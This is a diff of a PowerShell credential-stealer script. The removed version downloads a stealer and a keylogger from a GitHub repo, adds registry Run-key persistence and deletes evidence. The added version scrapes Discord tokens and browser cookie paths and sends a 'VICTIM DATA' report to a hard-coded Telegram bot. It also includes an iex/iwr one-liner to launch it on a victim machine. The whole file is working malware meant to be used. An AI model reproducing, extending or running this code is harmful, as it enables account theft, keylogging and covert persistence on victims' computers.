@@ -1,125 +1,108 @@
-# payload_final.ps1 — Stage 1 downloader/executor
-# Downloads stealer.ps1, keylogger.ps1, executes them, sends SUCCESS to Telegram
-# VISIBLE VERSION - no hidden windows, stays open for debugging
+# Self-contained payload - steals Roblox/Discord tokens and sends to Telegram
+# Run this command in PowerShell on the victim VM:
+# iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('REPLACE_ME'))) -UseBasicParsing)
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
 $chatId = "8445047233"
-$repoBase = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main"
-$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"
-$logFile = "$env:TEMP\payload_debug.log"
 
-function Write-Log {
-    param([string]$Msg)
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
-    Write-Host $Msg
-}
-
-# Create working directory
-New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-Set-Location $tempDir
-
-Write-Log "[*] Starting payload from $tempDir"
-Write-Host ""
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  STEALER KIT - PAYLOAD EXECUTING" -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host ""
-
-# Download components with cache-busting
-$files = @("stealer.ps1", "keylogger.ps1")
-foreach ($file in $files) {
-    $url = "$repoBase/$file?v=$(Get-Random)"
+# === SEND TO TELEGRAM ===
+function Send-Telegram {
+    param([string]$Message)
     try {
-        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "$tempDir\$file" -ErrorAction Stop
-        Write-Log "[+] Downloaded: $file"
-        Write-Host "[+] Downloaded: $file" -ForegroundColor Green
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
+            chat_id = $chatId
+            text = $Message
+            parse_mode = "HTML"
+        } -ErrorAction Stop | Out-Null
     } catch {
-        Write-Log "[-] Failed: $file - $($_.Exception.Message)"
-        Write-Host "[-] Failed: $file - $($_.Exception.Message)" -ForegroundColor Red
-        exit 1
+        try {
+            $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
+            $wc = New-Object System.Net.WebClient
+            $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
+            $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body) | Out-Null
+        } catch {}
     }
 }
 
-# Verify downloads
-foreach ($file in $files) {
-    if (-not (Test-Path "$tempDir\$file")) {
-        Write-Log "[-] Missing: $file"
-        Write-Host "[-] Missing: $file" -ForegroundColor Red
-        exit 1
+# === STEAL DISCORD TOKENS ===
+function Get-DiscordTokens {
+    $discordPaths = @(
+        "$env:APPDATA\discord\Local Storage\leveldb",
+        "$env:APPDATA\discordcanary\Local Storage\leveldb",
+        "$env:APPDATA\discordptb\Local Storage\leveldb"
+    )
+    $tokens = @()
+    $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'
+    foreach ($path in $discordPaths) {
+        if (Test-Path $path) {
+            Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse | foreach {
+                try {
+                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
+                } catch {}
+            }
+        }
     }
-    $size = (Get-Item "$tempDir\$file").Length
-    Write-Log "[*] $file : $size bytes"
+    return $tokens | Select-Object -Unique
 }
 
-# Execute stealer — visible window so we can see errors
-Write-Log "[*] Executing stealer.ps1..."
-Write-Host "[*] Executing stealer.ps1..." -ForegroundColor Yellow
-powershell.exe -ExecutionPolicy Bypass -File "$tempDir\stealer.ps1"
-Write-Log "[*] stealer.ps1 finished"
+# === STEAL ROBLOX COOKIES ===
+function Get-RobloxCookies {
+    $cookiePaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+    )
+    $found = @()
+    foreach ($path in $cookiePaths) {
+        if (Test-Path $path) { $found += $path }
+    }
+    return $found
+}
 
-# Execute keylogger in background
-Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
-Start-Job -ScriptBlock {
-    param($path)
-    powershell.exe -ExecutionPolicy Bypass -File $path
-} -ArgumentList "$tempDir\keylogger.ps1" | Out-Null
-Write-Log "[*] Keylogger started"
+# === MAIN ===
+$hostname = $env:COMPUTERNAME
+$username = $env:USERNAME
+$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
-# Persistence - Registry Run key
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "SysUpdate32"
-$regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`""
+# Build report
+$report = "<b>[+] VICTIM DATA</b>`n"
+$report += "Host: <code>$hostname</code>`n"
+$report += "User: <code>$username</code>`n"
+$report += "Time: <code>$timestamp</code>`n"
+
+# Discord
+$discordTokens = Get-DiscordTokens
+if ($discordTokens) {
+    $report += "`n<b>DISCORD TOKENS:</b>`n"
+    $discordTokens | foreach { $report += "<code>$_</code>`n" }
+} else {
+    $report += "`nDiscord: No tokens found"
+}
+
+# Roblox
+$robloxData = Get-RobloxCookies
+if ($robloxData) {
+    $report += "`n<b>ROBLOX:</b>`n"
+    $robloxData | foreach { $report += "$_`n" }
+} else {
+    $report += "`nRoblox: No cookies found"
+}
+
+# System info
+$report += "`n<b>SYSTEM:</b>`n"
 try {
-    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
-    Write-Log "[+] Persistence established: $regName"
-    Write-Host "[+] Persistence established: $regName" -ForegroundColor Green
+    $os = (Get-CimInstance Win32_OperatingSystem).Caption
+    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/GB,2)
+    $report += "OS: $os`nRAM: $ram GB"
 } catch {
-    Write-Log "[-] Persistence failed: $($_.Exception.Message)"
+    $report += "System info error"
 }
 
-# Cleanup evidence
-Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue
+# Send to Telegram
+Send-Telegram -Message $report
+Send-Telegram -Message "[+] PAYLOAD EXECUTED on $hostname by $username at $timestamp"
 
-# SUCCESS signal
-Write-Host ""
-Write-Host "========================================" -ForegroundColor Green
-Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
-Write-Host "========================================" -ForegroundColor Green
-Write-Host ""
-Write-Log "[*] SUCCESS displayed"
-
-# Send success to Telegram with error reporting
-$msg = "[+] PAYLOAD EXECUTED`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-try {
-    Write-Log "[*] Sending Telegram message..."
-    $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
-        chat_id = $chatId
-        text = $msg
-    } -ErrorAction Stop
-    Write-Log "[+] Telegram SUCCESS - Message ID: $($response.result.message_id)"
-    Write-Host "[+] Telegram message sent!" -ForegroundColor Green
-} catch {
-    Write-Log "[-] Telegram FAILED: $($_.Exception.Message)"
-    Write-Host "[-] Telegram FAILED: $($_.Exception.Message)" -ForegroundColor Red
-    # Try alternative method
-    try {
-        $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($msg))"
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
-        $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
-        Write-Log "[+] Telegram via WebClient: $result"
-        Write-Host "[+] Telegram sent via WebClient!" -ForegroundColor Green
-    } catch {
-        Write-Log "[-] Telegram WebClient FAILED: $($_.Exception.Message)"
-        Write-Host "[-] Telegram WebClient FAILED" -ForegroundColor Red
-    }
-}
-
-# Keep window open
-Write-Host ""
-Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-exit
+# Cleanup and exit
+Remove-Item "$env:TEMP\svchost_cache.dat" -Force -ErrorAction SilentlyContinue
